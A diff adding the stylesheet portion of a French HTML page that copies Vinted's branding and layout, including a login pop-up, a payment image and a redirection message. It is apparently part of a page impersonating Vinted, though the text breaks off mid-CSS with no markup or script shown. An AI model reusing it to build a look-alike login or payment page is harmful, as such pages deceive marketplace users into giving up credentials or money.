@@ -1,0 +1,1679 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinted - Acceuil - Achète, vends ou échange les vêtements, chaussures et accessoires que tu ne portes plus ! </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* Styles de la BANDE DÉFILANTE - Début */
+        .scrolling-band-container {
+            width: 100%; /* Prend toute la largeur disponible */
+            max-width: 100%; /* S'assure qu'il ne déborde pas */
+            /* MODIFICATION ICI : Supprimer la marge supérieure */
+            margin: 0 auto; /* Marge pour le séparer du contenu, et le centrer */
+            background-color: white; /* Fond blanc pour la bande */
+            display: flex;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            height: 50px; /* Hauteur de la bande défilante */
+        }
+
+        .scrolling-band-content-area {
+            flex-grow: 1;
+            padding: 10px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+        }
+
+        .scrolling-band-wrapper {
+            white-space: nowrap;
+            display: inline-block;
+            animation: scrollText 120s linear infinite; /* Animation de défilement continu */
+        }
+
+        .scrolling-band-wrapper p {
+            display: inline-block;
+            margin: 0;
+            padding-right: 50px; /* Espace entre les textes défilants */
+            font-size: 0.9em;
+            color: #333;
+        }
+
+        /* Animation de défilement pour la bande */
+        @keyframes scrollText {
+            0% {
+                transform: translateX(100%); /* Commence hors de l'écran à droite */
+            }
+            100% {
+                transform: translateX(-100%); /* Se termine hors de l'écran à gauche */
+            }
+        }
+
+        .scrolling-band-sidebar {
+            width: 450px; /* Largeur de la barre sombre (environ 12cm) */
+            background-color: #222;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            cursor: pointer;
+        }
+
+        .scrolling-band-sidebar .arrow {
+            font-size: 1.5em;
+            display: inline-block;
+            animation: arrowMove 1s ease-in-out infinite alternate; /* Animation de mouvement de la flèche */
+        }
+
+        @keyframes arrowMove {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(5px);
+            }
+        }
+        /* Styles de la BANDE DÉFILANTE - Fin */
+
+
+        /* Variables CSS pour les couleurs */
+        :root {
+            --vinted-green: #3ba78d;
+            --vinted-dark-grey: #333333;
+            --vinted-medium-grey: #555555;
+            --vinted-light-grey: #f5f5f5;
+            --vinted-border-grey: #e8e8e8;
+            --vinted-white: #ffffff;
+            --vinted-text-light-grey: #757575;
+            --vinted-footer-link: #888888;
+            --vinted-footer-hover: #3ba78d; /* Green for hover */
+            --vinted-error-red: #3ba78d; /* Ajout d'une couleur pour les erreurs/liens rouges */
+        }
+
+        /* Reset CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--vinted-dark-grey);
+            line-height: 1.5;
+            background-color: var(--vinted-white);
+            /* Add this to prevent horizontal scroll when menu is open */
+            overflow-x: hidden;
+            /* Original page background image */
+            background-image: url('Vinted.werder.webp');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            background-color: #f7f7f7; /* Fallback/base color */
+            /* font-family: Arial, sans-serif;  Keep original font for main content if desired */
+            color: #333;
+            line-height: 1.6;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        .container {
+            max-width: 1200px; /* Adjust for header/footer container */
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .main-header {
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            max-width: 1240px;
+            margin: 0 auto;
+        }
+
+        .header-left-section {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            font-weight: 700;
+            font-size: 24px;
+            color: var(--vinted-green);
+            letter-spacing: -0.5px;
+            white-space: nowrap;
+            margin-right: 50px;
+            /* Original text logo - will be hidden on mobile */
+        }
+
+        /* NEW: Style for logo image in header */
+        .header-logo-image {
+            height: 30px; /* Adjust as needed */
+            margin-right: 50px;
+            vertical-align: middle;
+            display: block; /* S'assure que l'image est traitée comme un bloc */
+        }
+
+        .search-container {
+            display: flex;
+            align-items: center;
+            background-color: var(--vinted-light-grey);
+            border-radius: 4px;
+            padding: 0px 15px;
+            width: 600px;
+            position: relative;
+            margin-left: 0;
+            margin-right: auto;
+        }
+
+        .articles-dropdown {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            padding: 8px 0px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-right: 15px;
+            white-space: nowrap;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 15px;
+        }
+
+        .articles-dropdown i {
+            font-size: 12px;
+        }
+
+        .search-bar {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-bar i {
+            color: var(--vinted-medium-grey);
+            margin-right: 10px;
+        }
+
+        .search-bar input {
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            color: var(--vinted-dark-grey);
+            width: 100%;
+            padding: 8px 0;
+        }
+
+        .search-bar input::placeholder {
+            color: var(--vinted-medium-grey);
+        }
+
+        .top-nav {
+            margin-left: 60px;
+        }
+
+        .top-nav ul {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-white {
+            background-color: var(--vinted-white);
+            color: var(--vinted-dark-grey);
+            border: 1px solid var(--vinted-border-grey);
+        }
+
+        .btn-white:hover {
+            background-color: var(--vinted-light-grey);
+        }
+
+        .btn-green {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 12px 15px;
+            height: auto;
+        }
+
+        .btn-green:hover {
+            background-color: #008f51;
+        }
+
+        .icon-link {
+            font-size: 18px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+        /* Style for header icons */
+        .header-icon {
+            font-size: 20px; /* Adjust size as needed */
+            color: var(--vinted-medium-grey);
+            background-color: var(--vinted-white); /* White background */
+            border: 1px solid var(--vinted-border-grey); /* Border like the 'white' button */
+            border-radius: 5px;
+            padding: 7px 10px; /* Adjust padding to match button size */
+            cursor: pointer;
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px; /* Space between icons */
+        }
+
+        .header-icon:hover {
+            background-color: var(--vinted-light-grey);
+            border-color: var(--vinted-dark-grey);
+        }
+
+        .lang-select {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        /* Categories Nav (Desktop) */
+        .categories-nav {
+            background-color: var(--vinted-white);
+            border-top: 1px solid var(--vinted-border-grey);
+            padding: 10px 0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+            display: block; /* Shown on desktop */
+        }
+
+        .categories-nav .container {
+            display: flex;
+            justify-content: flex-start;
+            flex-wrap: nowrap;
+            gap: 20px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 0 20px;
+        }
+
+        .categories-nav ul {
+            display: flex;
+            flex-wrap: nowrap;
+            gap: 20px;
+        }
+
+        .categories-nav ul li {
+            flex-shrink: 0;
+        }
+
+        .categories-nav ul li a {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            white-space: nowrap;
+            padding: 5px 0;
+            transition: color 0.2s ease;
+        }
+
+        .categories-nav ul li a:hover {
+            color: var(--vinted-green);
+        }
+
+        /* Footer */
+        .main-footer {
+            background-color: var(--vinted-white);
+            padding: 40px 0 20px 0;
+            margin-top: 0; /* Supprime la marge supérieure */
+            border-top: 1px solid var(--vinted-border-grey);
+        }
+
+        /* Styles pour centrer le bouton "Voir plus" */
+        .footer-top-button {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            width: 100%;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+        .footer-top-button .btn-green {
+            width: 100%;
+            max-width: 200px;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-column h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--vinted-dark-grey);
+        }
+
+        .footer-column ul li {
+            margin-bottom: 8px;
+        }
+
+        .footer-column ul li a {
+            font-size: 14px;
+            color: var(--vinted-footer-link);
+            transition: color 0.2s ease;
+        }
+
+        .footer-column ul li a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid var(--vinted-border-grey);
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .social-icons a {
+            color: var(--vinted-footer-link);
+            font-size: 20px;
+            margin-right: 15px;
+            transition: color 0.2s ease;
+        }
+
+        .social-icons a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .app-badges img {
+            height: 40px;
+            margin-left: 10px;
+        }
+
+        .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .legal-links a {
+            font-size: 13px;
+            color: var(--vinted-footer-link);
+            white-space: nowrap;
+            transition: color 0.2s ease;
+        }
+
+        .legal-links a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        /* Styles pour le formulaire de connexion (pop-up) */
+        .login-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Ensure it's on top of everything */
+            visibility: hidden; /* Hidden by default */
+            opacity: 0; /* Faded out by default */
+            transition: visibility 0s, opacity 0.3s ease;
+        }
+
+        .login-modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .login-form-container {
+            background-color: var(--vinted-white);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 420px;
+            position: relative;
+            transform: translateY(20px); /* Slightly move down when appearing */
+            transition: transform 0.3s ease;
+        }
+
+        .login-modal-overlay.active .login-form-container {
+            transform: translateY(0);
+        }
+
+        .login-form-container .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 24px;
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .login-form-container .close-btn:hover {
+            color: var(--vinted-dark-grey);
+        }
+
+        .login-form-container h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            color: var(--vinted-dark-grey);
+        }
+
+        .login-form-container form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .login-form-container input[type="text"],
+        .login-form-container input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--vinted-border-grey);
+            border-radius: 4px;
+            font-size: 16px;
+            color: var(--vinted-dark-grey);
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .login-form-container input[type="text"]:focus,
+        .login-form-container input[type="password"]:focus {
+            border-color: var(--vinted-green);
+            box-shadow: 0 0 0 1px var(--vinted-green);
+        }
+
+        .login-form-container .password-input-wrapper {
+            position: relative;
+        }
+
+        .login-form-container .password-input-wrapper i {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .login-form-container .btn-green {
+            width: 100%;
+            padding: 14px 20px;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+
+        .login-form-container .form-links {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .login-form-container .form-links a {
+            font-size: 14px;
+            color: var(--vinted-error-red); /* Using red for forgot password link as seen on Vinted */
+            transition: text-decoration 0.2s ease;
+            display: block; /* Each link on a new line */
+            margin-bottom: 10px;
+        }
+
+        .login-form-container .form-links a:hover {
+            text-decoration: underline;
+        }
+
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .header-top {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 15px;
+            }
+
+            .header-left-section {
+                width: 100%;
+                justify-content: center;
+                margin-bottom: 10px;
+                flex-wrap: wrap;
+            }
+            .logo {
+                margin-right: 15px;
+            }
+            .header-logo-image { /* Adjust for responsive */
+                margin-right: 15px;
+            }
+
+            .search-container {
+                width: 100%;
+                max-width: 600px;
+            }
+
+            .top-nav {
+                margin-left: 0;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+            .top-nav ul {
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                width: 100%;
+                gap: 10px;
+            }
+            .top-nav ul li {
+                flex-shrink: 0;
+            }
+
+            .btn, .icon-link, .lang-select {
+                font-size: 14px;
+            }
+
+            .footer-content {
+                justify-content: center;
+                text-align: center;
+            }
+            .footer-column {
+                min-width: 45%;
+            }
+        }
+
+        /* Mobile Header specific styles */
+        .mobile-header-top {
+            display: none; /* Hidden by default */
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 15px;
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            width: 100%;
+        }
+
+        .mobile-menu-icon {
+            font-size: 24px;
+            color: var(--vinted-dark-grey);
+            cursor: pointer;
+        }
+
+        /* Le conteneur pour le logo mobile, il doit être flexible pour le centrage */
+        .mobile-header-logo {
+            /* font-weight: 700; */ /* Pas besoin si c'est une image */
+            /* font-size: 24px; */ /* Pas besoin si c'est une image */
+            /* color: var(--vinted-green); */ /* Pas besoin si c'est une image */
+            /* letter-spacing: -0.5px; */ /* Pas besoin si c'est une image */
+            white-space: nowrap;
+            text-align: center; /* Center the image within this container */
+            flex-grow: 1; /* Allow logo to take available space for centering */
+            /* Nous n'avons pas besoin de display:none ici */
+        }
+
+        /* NEW: Style for logo image in mobile header */
+        .mobile-header-logo-image {
+            height: 25px; /* Adjust as needed for mobile */
+            display: block; /* Make sure the image is treated as a block */
+            margin: 0 auto; /* Center the image horizontally */
+            width: auto; /* Maintain aspect ratio */
+        }
+
+
+        /* New styles for mobile header icons */
+        .mobile-header-icons {
+            display: flex;
+            gap: 10px; /* Space between mobile icons */
+        }
+
+        .mobile-header-icon {
+            font-size: 20px;
+            color: var(--vinted-medium-grey);
+            padding: 5px; /* Smaller padding for mobile icons */
+            cursor: pointer;
+            transition: color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-header-icon:hover {
+            color: var(--vinted-dark-grey);
+        }
+
+        /* NEW: Mobile Navigation Menu Styles */
+        .mobile-nav-menu {
+            position: fixed;
+            top: 0;
+            left: -100%; /* Start off-screen to the left */
+            width: 80%; /* Adjust as needed */
+            max-width: 300px; /* Limit width */
+            height: 100%;
+            background-color: var(--vinted-white);
+            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.2);
+            z-index: 200; /* Higher than header-top */
+            transition: left 0.3s ease-in-out; /* Smooth slide effect */
+            overflow-y: scroll; /* Garde le défilement fonctionnel */
+            padding-top: 60px; /* Space for the header if it overlaps */
+            scrollbar-width: none; /* Pour Firefox */
+            -ms-overflow-style: none;  /* Pour Internet Explorer et Edge */
+        }
+
+        /* Cache la barre de défilement pour les navigateurs basés sur WebKit (Chrome, Safari) */
+        .mobile-nav-menu::-webkit-scrollbar {
+            display: none;
+        }
+
+        .mobile-nav-menu.active {
+            left: 0; /* Slide into view */
+        }
+
+        .mobile-nav-menu ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .mobile-nav-menu ul li {
+            border-bottom: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-nav-menu ul li a,
+        .mobile-nav-menu .menu-item-button {
+            display: block;
+            padding: 15px 20px;
+            color: var(--vinted-dark-grey);
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .mobile-nav-menu ul li a:hover,
+        .mobile-nav-menu .menu-item-button:hover {
+            background-color: var(--vinted-light-grey);
+        }
+
+        .mobile-nav-menu .menu-item-button {
+            background-color: transparent; /* Override default button style */
+            border: none;
+            width: 100%;
+            text-align: left;
+            cursor: pointer;
+            box-sizing: border-box; /* Include padding in width */
+            color: var(--vinted-dark-grey); /* Ensure text color */
+        }
+
+        /* Specific style for "Vends tes articles" in mobile menu */
+        .mobile-nav-menu .menu-item-button.sell-articles {
+            color: var(--vinted-green);
+            font-weight: 600;
+        }
+
+        /* Overlay to dim background when mobile menu is open */
+        .mobile-menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 150; /* Between header and mobile menu */
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.3s ease;
+        }
+
+        .mobile-menu-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* NEW: Mobile Search Bar Container */
+        .mobile-search-bar-container {
+            display: none; /* Hidden by default, only shown on mobile */
+            background-color: var(--vinted-white);
+            padding: 10px 15px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            border-top: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-search-bar-container .search-container {
+            width: 100%;
+            padding: 6px 12px;
+            font-size: 13px;
+        }
+
+        .mobile-search-bar-container .articles-dropdown {
+            font-size: 13px;
+            padding: 0;
+            margin-right: 10px;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 10px;
+        }
+
+        .mobile-search-bar-container .search-bar input {
+            font-size: 13px;
+            padding: 6px 0;
+        }
+
+        /* NOUVEAU: Catégories alignées horizontalement et défilables (style Vinted Chip) */
+        .mobile-categories-chips {
+            display: none; /* Hidden by default, only shown on mobile */
+            background-color: var(--vinted-white);
+            padding: 10px 0; /* Vertical padding */
+            border-top: 1px solid var(--vinted-border-grey);
+            border-bottom: 1px solid var(--vinted-border-grey);
+            overflow-x: auto; /* Allows horizontal scrolling */
+            -webkit-overflow-scrolling: touch; /* Improves scrolling on iOS */
+            white-space: nowrap; /* Prevents elements from wrapping to the next line */
+            scrollbar-width: none; /* Hide scrollbar for Firefox */
+            -ms-overflow-style: none; /* Hide scrollbar for IE/Edge */
+        }
+
+        /* Hide scrollbar for Webkit browsers (Chrome, Safari) */
+        .mobile-categories-chips::-webkit-scrollbar {
+            display: none;
+        }
+
+        .mobile-categories-chips ul {
+            display: inline-flex; /* Use inline-flex so items are on a single line */
+            gap: 8px; /* Space between chips, adjust as needed */
+            padding: 0 15px; /* Horizontal padding for scrolling */
+            margin: 0; /* Reset default ul margin */
+        }
+
+        .mobile-categories-chips li {
+            flex-shrink: 0; /* Prevents items from shrinking */
+            list-style: none; /* Remove list style */
+        }
+
+        .mobile-categories-chips a {
+            display: inline-flex; /* Use inline-flex for content inside the chip */
+            align-items: center; /* Center content vertically */
+            justify-content: center; /* Center content horizontally */
+            padding: 8px 16px; /* Padding inside the chip */
+            border: 1px solid var(--vinted-border-grey); /* Outlined style */
+            border-radius: 20px; /* Very rounded corners for chip effect */
+            background-color: var(--vinted-white); /* White background */
+            color: var(--vinted-medium-grey); /* Text color */
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            white-space: nowrap; /* Ensure text stays on one line within the chip */
+            transition: background-color 0.2s ease, border-color 0.2s ease, color 0.2s ease;
+        }
+
+        .mobile-categories-chips a:hover {
+            background-color: var(--vinted-light-grey); /* Light grey on hover */
+            border-color: var(--vinted-dark-grey); /* Darker border on hover */
+            color: var(--vinted-dark-grey); /* Darker text on hover */
+        }
+
+        .mobile-categories-chips a i {
+            margin-right: 6px; /* Space between icon and text */
+            font-size: 14px; /* Icon size */
+        }
+
+        @media (max-width: 1024px) {
+            /* Adjust header-top for desktop under 1024px, but before mobile breakpoint */
+            .header-top .top-nav ul {
+                gap: 10px; /* Adjust gap for smaller desktop views */
+            }
+            .header-top .header-icon {
+                margin-right: 5px; /* Reduce margin between icons */
+                font-size: 16px;
+                padding: 6px 8px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-top {
+                display: none; /* Hide desktop header elements on mobile */
+            }
+            .categories-nav {
+                display: none; /* Hide desktop categories nav on mobile */
+            }
+
+            .mobile-header-top {
+                display: flex; /* Show mobile header elements on mobile */
+            }
+
+            .mobile-search-bar-container {
+                display: block; /* Show new mobile search bar on mobile */
+            }
+
+            .mobile-categories-chips { /* Show new chip categories */
+                display: block;
+            }
+
+            /* Hide the desktop search container within header-top on mobile */
+            .header-top .search-container {
+                display: none;
+            }
+
+            .header-left-section {
+                width: 100%;
+                justify-content: center;
+                margin-bottom: 15px;
+                flex-wrap: wrap;
+            }
+            .logo {
+                display: none; /* Hide the desktop text logo */
+            }
+            .header-logo-image {
+                display: none; /* Hide the desktop image logo */
+                /* margin-right: 0; */
+                /* margin-bottom: 10px; */
+                /* width: auto; */
+                /* max-width: 80px; */
+                /* height: auto; */
+            }
+
+            /* CORRECTION: Nous ne voulons PAS cacher le conteneur du logo mobile */
+            /* .mobile-header-logo {
+                display: none;
+            } */
+            .mobile-header-logo-image {
+                display: block; /* S'assurer que l'image du logo mobile s'affiche */
+                margin: 0 auto; /* Centrer l'image */
+            }
+
+
+            .top-nav {
+                margin-left: 0;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+            .top-nav ul {
+                flex-direction: column;
+                gap: 10px;
+                margin-top: 10px;
+                width: 100%;
+                align-items: center;
+            }
+            .top-nav ul li {
+                width: 100%;
+                max-width: 280px;
+                text-align: center;
+                margin-right: 0 !important;
+            }
+
+            .top-nav ul li .btn,
+            .top-nav ul li .icon-link,
+            .top-nav ul li .lang-select {
+                width: 100%;
+                display: block;
+                text-align: center;
+                padding: 10px 15px;
+                font-size: 14px;
+            }
+
+            .top-nav ul li:last-child {
+                width: auto;
+                max-width: none;
+            }
+            .top-nav ul li:last-child .lang-select {
+                display: inline-flex;
+                justify-content: center;
+                align-items: center;
+                width: auto;
+                padding: 0;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                gap: 20px;
+            }
+            .footer-column {
+                min-width: unset;
+                width: 100%;
+            }
+            .footer-column ul {
+                text-align: center;
+            }
+            .footer-column ul li {
+                display: block;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+            .social-icons {
+                margin-bottom: 15px;
+            }
+            .app-badges {
+                margin-top: 15px;
+            }
+            .legal-links {
+                justify-content: center;
+                margin-top: 15px;
+            }
+
+            .login-form-container {
+                padding: 20px;
+            }
+            .login-form-container h2 {
+                font-size: 20px;
+                margin-bottom: 20px;
+            }
+            .login-form-container input {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+            .login-form-container .btn-green {
+                padding: 12px 15px;
+                font-size: 14px;
+            }
+            .login-form-container .form-links a {
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-left-section {
+                align-items: center;
+            }
+            .logo {
+                margin-bottom: 10px;
+            }
+            .header-logo-image {
+                margin-bottom: 10px;
+            }
+            .top-nav ul {
+                align-items: center;
+            }
+
+            .footer-top-button {
+                width: 100%;
+                padding: 0 15px;
+            }
+            .footer-top-button .btn-green {
+                width: 100%;
+                max-width: 280px;
+            }
+
+            /* Ajustements pour les chips de catégories sur très petits écrans */
+            .mobile-categories-chips ul {
+                gap: 6px; /* Slightly less gap on very small screens */
+                padding: 0 10px;
+            }
+            .mobile-categories-chips a {
+                padding: 7px 14px; /* Slightly smaller padding */
+                font-size: 13px; /* Smaller font size */
+            }
+            .mobile-categories-chips a i {
+                font-size: 13px;
+            }
+        }
+
+        /* --- Original page CSS styles (adjust for compatibility if needed) --- */
+        .page-wrapper {
+            max-width: 900px;
+            /* MODIFICATION ICI : Assurer qu'il n'y a pas de marge supérieure */
+            margin: 0 auto;
+            width: 100%;
+            padding: 0;
+            background-color: transparent; /* Ensure page-wrapper itself is transparent to show body background */
+        }
+
+        /* Adjustments for .container in the original page to ensure it's not too wide */
+        .page-wrapper .container {
+            width: 100%;
+            margin: 0 auto;
+            background-color: white;
+            padding: 5vw;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 100%; /* Ensure it fits within page-wrapper */
+        }
+
+        .logo-text {
+            color: #07a1aa;
+            font-size: clamp(24px, 6vw, 32px);
+            margin: 0;
+            padding: 5vw 0;
+            font-weight: bold;
+            display: block;
+            text-align: center;
+            background-color: white;
+        }
+
+        .logo-image { /* Logo in the main content area */
+            width: 25vw;
+            max-width: 100px;
+            margin: 0 auto 5vw;
+            display: block;
+        }
+
+        .payment-image {
+            width: 100%;
+            display: block;
+            margin: 0; /* Assure pas de marge supérieure sur l'image */
+            padding: 0;
+            border: none;
+        }
+
+        h2 {
+            color: #07a1aa;
+            margin: 5vw 0 3vw;
+            text-align: center;
+            font-size: clamp(20px, 5vw, 26px);
+        }
+
+        p {
+            color: #333;
+            margin-bottom: 5vw;
+            text-align: center;
+            font-size: clamp(16px, 4vw, 18px);
+        }
+
+        .check {
+            font-size: clamp(50px, 15vw, 80px);
+            color: #07a1aa;
+            margin: 5vw 0;
+            text-align: center;
+            line-height: 1;
+        }
+
+        .support-text {
+            margin-top: 30px;
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+        }
+
+        a.button {
+            display: inline-block;
+            padding: 3vw 6vw;
+            background-color: #07a1aa;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 5vw;
+            cursor: pointer;
+            font-size: clamp(16px, 4vw, 18px);
+        }
+
+        .footer-original-page { /* Renamed to avoid conflict with main-footer */
+            font-size: clamp(12px, 3vw, 14px);
+            color: gray;
+            margin-top: 8vw;
+            text-align: center;
+        }
+
+        /* NOUVEAU STYLE POUR CENTRER L'ANIMATION */
+        .lottie-container {
+            display: flex;
+            justify-content: center;
+            margin: 0 auto;
+            padding: 20px 0;
+            width: 100%; /* S'assure que le conteneur lottie prend toute la largeur */
+        }
+
+        .button-container {
+            text-align: center;
+        }
+
+        /* Styles for the redirection message */
+        #redirection-message {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f0f8ff; /* Light blue background */
+            color: #333;
+            font-size: 1.1em;
+            font-weight: 500;
+            border: 1px solid #cceeff;
+            border-radius: 5px;
+            text-align: center;
+            display: none; /* Hidden by default */
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        @media (min-width: 768px) {
+            .page-wrapper .container {
+                padding: 30px;
+            }
+            .logo-text {
+                padding: 20px 0;
+            }
+            .logo-image {
+                margin-bottom: 20px;
+            }
+            h2 {
+                margin: 20px 0 10px;
+            }
+            p {
+                margin-bottom: 20px;
+            }
+            .check {
+                margin: 20px 0;
+            }
+            a.button {
+                padding: 12px 25px;
+                margin-top: 20px;
+            }
+            .footer-original-page {
+                margin-top: 40px;
+            }
+        }
+        #personalized-message-container {
+    background-color: #f8f9fa;
+    padding: 20px;
+    border-radius: 8px;
+    margin: 20px auto;
+    max-width: 900px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    border-left: 4px solid var(--vinted-green);
+}
+
+#personalized-message-container h3 {
+    color: var(--vinted-green);
+    margin-bottom: 10px;
+    font-size: 1.3em;
+}
+
+#personalized-message-container p {
+    color: var(--vinted-dark-grey);
+    font-size: 1em;
+    line-height: 1.5;
+}
+
+        /* NOUVEAUX STYLES POUR LES TEXTES MIS EN ÉVIDENCE */
+        .highlighted-text {
+            text-align: center;
+            padding: 20px;
+            margin: 30px auto; /* Centrer le bloc et ajouter de l'espace */
+            max-width: 700px; /* Limiter la largeur pour la lisibilité */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            line-height: 1.6; /* Améliorer la lisibilité */
+            font-weight: 600; /* Plus audacieux */
+        }
+
+        .highlighted-text-1 {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            font-size: clamp(18px, 4.5vw, 22px);
+            padding: 25px 20px;
+            margin-bottom: 40px; /* Plus d'espace après ce bloc */
+        }
+
+        .highlighted-text-2 {
+            background-color: var(--vinted-white);
+            color: var(--vinted-dark-grey);
+            font-size: clamp(17px, 4.2vw, 20px);
+            border: 2px solid var(--vinted-green);
+            box-shadow: 0 4px 15px rgba(59, 167, 141, 0.2); /* Ombre verte */
+            padding: 25px 20px;
+            margin-top: 40px; /* Plus d'espace avant ce bloc */
+        }
+
+        .highlighted-text-3,
